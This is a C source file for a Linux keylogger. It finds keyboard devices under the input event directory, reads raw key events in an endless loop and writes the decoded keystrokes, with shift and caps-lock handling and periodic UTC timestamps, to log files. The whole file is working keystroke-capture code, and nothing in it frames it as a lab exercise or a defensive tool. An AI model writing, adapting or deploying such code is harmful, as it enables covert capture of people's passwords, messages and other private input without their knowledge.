#include "includes.h"
#include "Keyboard.h"
#include <stdlib.h>
#include <stdio.h>

//This funtion opens the event file for a keyboard struct
//The path to the file is stored in the devPath member of the struct
//The open function opens this file in read only mode and returns a file descriptor
//The file descriptor is stored in the file_discr member of the struct.
short openDevice(struct Keyboard *kb)
{
  int x = open(kb->devPath, O_RDONLY);
  kb->file_discr = x;
  return x; //Return file descriptor to calling function
}

//This function which takes a keyboard structure as an argument logs
//key events for the instance of keyboard passed.
void log_data(struct Keyboard kb)
{
  //Open the input device file for the keyboard
  //If the file descriptor returned by openDevice is less than zero, exit the function
  if(openDevice(&kb) < 0)
    return;

  //fileHandle is member of the keyboard struct which is a pointer to a file
  kb.fileHandle = fopen(kb.log_path , "a");
  if(kb.fileHandle == NULL)
    return; //File was not opened succesfully


  //Print current GMT time as an header for new log
  time_t r_time;
  time(&r_time);
  kb.time_info = *(gmtime(&r_time));
  fprintf(kb.fileHandle , "\n\n| UTC: %s %s %02d %2d:%02d:%02d %d GMT |\n" ,
          day[kb.time_info.tm_wday], month[kb.time_info.tm_mon], kb.time_info.tm_mday,
          kb.time_info.tm_hour, kb.time_info.tm_min, kb.time_info.tm_sec, kb.time_info.tm_year + 1900);
  fclose(kb.fileHandle);
  //current GMT time added to log file

  struct input_event keyEvent;
  const char* keyOutput;

  //Event loop
  while(1)
  {
    read(kb.file_discr, &keyEvent, sizeof(struct input_event));

    if(keyEvent.type == 1)
    {
      if(keyEvent.code > 0 && keyEvent.code < 100)
      {
        const char *pressed = keys[keyEvent.code];
        if(keyEvent.value == 1)
        {
          if(strcmp(pressed , "") == 0);
          else if(strcmp(pressed , "shft") == 0)
            kb.shift = 1;
          else if(strcmp(pressed , "cap") == 0)
          {
            if(kb.caps == 0)
              kb.caps = 1;
            else
              kb.caps = 0;
          }else{
            //Record press and release for
            //modifier keys (shift, ctrl, and super)
            char ch = *keys[keyEvent.code];
            kb.fileHandle = fopen(kb.log_path , "a");

            time(&r_time);
            int hr = kb.time_info.tm_hour;
            int min = kb.time_info.tm_min;
            int sec = kb.time_info.tm_sec;
            kb.time_info = *(gmtime(&r_time));

            if(((kb.time_info.tm_min - min) >= 2) || ((kb.time_info.tm_min - min) <= -2))
            {
              fprintf(kb.fileHandle , "\n\n| UTC: %s %s %02d %2d:%02d:%02d %d GMT |\n" ,
                      day[kb.time_info.tm_wday], month[kb.time_info.tm_mon], kb.time_info.tm_mday,
                      kb.time_info.tm_hour, kb.time_info.tm_min, kb.time_info.tm_sec, kb.time_info.tm_year + 1900);
            }

            if(kb.shift == 1 && kb.caps == 0 && isalpha(ch)){
              ch = ch - 32;
              fprintf(kb.fileHandle , "%c" , ch);
            }else if(kb.shift == 0 && kb.caps == 1 && isalpha(ch)){
              ch = ch - 32;
              fprintf(kb.fileHandle , "%c" , ch);
            }
            else if(kb.shift == 1 &&  !isalpha(ch))
              fprintf(kb.fileHandle , "%s" , shift_keys[keyEvent.code]);
            else
              fprintf(kb.fileHandle , "%s" , keys[keyEvent.code]);

            fclose(kb.fileHandle);
          }
        }else if(keyEvent.value == 0)
        {
          if(strcmp(pressed , "shft") == 0)
            kb.shift = 0;
        }
      }
    }
  }

}







static int _isEventDevice(const struct dirent* directory) {
    return strncmp(EVENT_DEVICE_NAME, directory->d_name, 5) == 0;
}


short regex_match(regex_t *r, const char *reg_exp, const char *to_match)
{
  if(regcomp(r , reg_exp, REG_EXTENDED))
    return 0;
  regmatch_t m[2];
  if(regexec(r , to_match, 2, m, 0))
    return 0;
  return 1;
}

void KeyboardScan(int *keyboard_count , const short max_keyboard , char **dev , char **log_p)
{
    struct dirent** dirList;

    // Get number and list of devices in event device directory
    int numDevices = scandir(INPUT_DEVICE_DIR, &dirList, _isEventDevice, versionsort);
    *keyboard_count = 0;

    for (int i = 0; i < numDevices; ++i) {
        // Get path to event device and open it
        char *deviceName = dirList[i]->d_name;
        char *devicePath = malloc(strlen(INPUT_DEVICE_DIR) + strlen(deviceName) + 1);
        strcpy(devicePath , INPUT_DEVICE_DIR);
        strcat(devicePath , deviceName);

        char deviceInfo[256];
        int deviceFile = -1;

        deviceFile = open(devicePath, O_RDONLY);
        if (deviceFile < 0) {
            continue;
        }

        // Get event device information
        ioctl(deviceFile, EVIOCGNAME(sizeof(deviceInfo)), deviceInfo);
        close(deviceFile);

        regex_t keyboardNamePattern;
        if((regex_match(&keyboardNamePattern, ".*[Kk]eyboard.*" , deviceInfo) == 1) && *keyboard_count < max_keyboard)
        {
          dev[*keyboard_count] = devicePath;
          log_p[*keyboard_count] = deviceName;
          *keyboard_count += 1;
        }
        free(dirList[i]);
    }
}
